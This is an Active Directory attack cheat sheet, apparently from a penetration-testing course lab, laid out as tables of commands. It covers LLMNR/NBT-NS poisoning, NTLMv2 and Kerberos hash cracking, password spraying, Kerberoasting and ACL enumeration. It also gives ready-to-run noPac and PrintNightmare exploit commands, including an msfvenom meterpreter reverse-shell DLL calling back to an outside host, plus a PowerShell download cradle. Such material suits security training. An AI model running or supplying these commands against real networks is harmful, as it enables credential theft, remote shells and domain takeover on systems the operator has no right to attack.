# Active Directory Enumeration & Attacks Cheat Sheet

## Initial Enumeration

### Commands

| Command | Description |
|---------|-------------|
| `nslookup ns1.inlanefreight.com` | Used to query the domain name system and discover the IP address to domain name mapping of the target from a Linux-based host. |
| `sudo tcpdump -i ens224` | Captures network packets on the specified network interface on a Linux-based host. |
| `sudo responder -I ens224 -A` | Responds to and analyzes LLMNR, NBT-NS, and MDNS queries in Passive Analysis mode on the specified interface. |
| `fping -asgq 172.16.5.0/23` | Performs a ping sweep on the specified network segment. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an Nmap scan with OS detection, version detection, script scanning, and traceroute enabled using a list of hosts. Outputs results to a specified file. |

## Active Directory Enumeration

### Commands

| Command | Description |
|---------|-------------|
| `sudo git clone https://github.com/ropnop/kerbrute.git` | Clones the Kerbrute tool repository. |
| `make help` | Lists possible compiling options with the `make` command. |
| `sudo make all` | Compiles a Kerbrute binary for multiple OS platforms. |
| `./kerbrute_linux_amd64` | Tests the compiled Kerbrute binary. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` | Moves the Kerbrute binary to a directory in the Linux user’s PATH for easier access. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Discovers usernames in the specified domain and outputs results to a file. |

## LLMNR/NBT-NS Poisoning

### Commands

| Command | Description |
|---------|-------------|
| `responder -h` | Displays usage instructions for Responder. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Cracks NTLMv2 hashes captured by Responder using a wordlist. |
| `Import-Module .\Inveigh.ps1` | Imports the Windows-based tool Inveigh.ps1. |
| `(Get-Command Invoke-Inveigh).Parameters` | Outputs options and functionalities available with Invoke-Inveigh. |
| `Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y` | Starts Inveigh with LLMNR & NBNS spoofing enabled, outputting results to a file. |
| `\Inveigh.exe` | Runs the C# implementation of Inveigh. |
| `Disable NetBIOS` | A PowerShell script used to disable NBT-NS on a Windows host. |

## Password Spraying & Password Policies

### Commands

| Command | Description |
|---------|-------------|
| `#!/bin/bash for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}} do echo $x; done` | Generates 16,079,616 possible username combinations in Bash. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Enumerates password policies using valid credentials. |
| `rpcclient -U "" -N 172.16.5.5` | Discovers domain information through SMB NULL sessions. |
| `enum4linux -P 172.16.5.5` | Enumerates the password policy in a Windows domain. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength` | Uses LDAP to enumerate password policies. |

## Credentialed Enumeration

### Commands

| Command | Description |
|---------|-------------|
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over SMB and attempts to discover users. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over SMB and attempts to discover groups. |

## File Transfers

### Commands

| Command | Description |
|---------|-------------|
| `sudo python3 -m http.server 8001` | Starts a Python web server for file hosting. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | Downloads a file using PowerShell. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts an Impacket SMB server for hosting files. |

## Kerberoasting

### Commands

| Command | Description |
|---------|-------------|
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Lists SPNs on the target domain. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Cracks Kerberos ticket hashes using Hashcat. |

## ACL Enumeration

### Commands

| Command | Description |
|---------|-------------|
| `Find-InterestingDomainAcl` | Uses PowerView to find object ACLs in the target Windows domain with modification rights. |
| `Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley` | Imports PowerView and retrieves the SID of a specific user account. |

## Privileged Access

### Commands

| Command | Description |
|---------|-------------|
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | Enumerates the Remote Desktop Users group on a Windows target. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable for a user's password in a secure string format. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable combining a username and password. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Establishes a PowerShell session with a target Windows system. |

## Additional Modules & Exploits

### NoPac Exploit

| Command | Description |
|---------|-------------|
| `sudo git clone https://github.com/Ridter/noPac.git` | Clones the noPac exploit repository. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Checks for vulnerability to noPac. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell -impersonate administrator -use-ldap` | Exploits the noPac vulnerability to gain a SYSTEM shell. |

### PrintNightmare Exploit

| Command | Description |
|---------|-------------|
| `git clone https://github.com/cube0x0/CVE-2021-1675.git` | Clones a PrintNightmare exploit repository. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Generates a DLL payload for the exploit. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit. |

*(This document continues with other sections like Trust Relationships, ASREPRoasting, etc., following the same structure.)*
